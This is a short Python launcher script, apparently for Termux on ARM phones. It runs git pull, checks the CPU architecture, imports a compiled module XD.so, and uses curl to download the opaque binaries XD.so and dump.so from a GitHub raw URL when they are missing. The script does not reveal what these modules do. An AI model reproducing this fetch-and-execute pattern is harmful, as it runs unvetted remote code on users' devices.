import os
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if 'aarch' in arch:
    print('\033[1;34m\n Congratulations! Your Device Support This Tools\033[1;37m')
    if path.isfile("XD.so"):
        import XD
        XD.menu()
    else:
        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD.so -o XD.so")
    if path.isfile("dump.so"):
        pass
    else:
        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/dump.so -o dump.so")
else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
